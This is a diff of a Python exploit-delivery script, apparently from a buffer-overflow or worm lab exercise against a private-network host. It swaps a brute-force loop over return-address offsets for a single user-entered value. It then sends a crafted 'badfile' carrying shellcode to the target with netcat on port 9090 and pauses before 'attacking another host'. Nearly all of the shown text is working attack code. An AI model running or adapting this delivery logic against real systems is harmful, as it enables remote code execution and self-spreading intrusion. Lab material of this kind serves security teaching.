@@ -46,29 +46,27 @@ def createBadfile(ret):
 def getNextTarget():
    return '10.151.0.71'
 
-# Main loop for trying different values of ret
-for ret_value in range(100, 401):
-    print(f"Trying ret value: {ret_value}")
+# Get user input for ret value
+try:
+    ret_value = int(input("Enter the value for ret (an integer between 100 and 400): "))
+    if not (100 <= ret_value <= 400):
+        raise ValueError("Invalid input. Ret value must be between 100 and 400.")
+except ValueError as e:
+    print(f"Error: {e}")
+    sys.exit(1)
 
-    # Create the badfile with the current ret value
-    createBadfile(ret_value)
+# Create the badfile with the user-specified ret value
+createBadfile(ret_value)
 
-    # Ask the user if they want to proceed
-    user_input = input("Do you want to proceed? (y/n): ").lower()
+# Continue with the attack
+targetIP = getNextTarget()
+print(f"**********************************", flush=True)
+print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
+print(f"**********************************", flush=True)
+subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
 
-    if user_input != 'y':
-        print("Exiting.")
-        sys.exit(0)
+# Give the shellcode some time to run on the target host
+time.sleep(1)
 
-    # Continue with the attack
-    targetIP = getNextTarget()
-    print(f"**********************************", flush=True)
-    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
-    print(f"**********************************", flush=True)
-    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
-
-    # Give the shellcode some time to run on the target host
-    time.sleep(1)
-
-    # Sleep for 10 seconds before attacking another host
-    time.sleep(10)
+# Sleep for 10 seconds before attacking another host
+time.sleep(10)
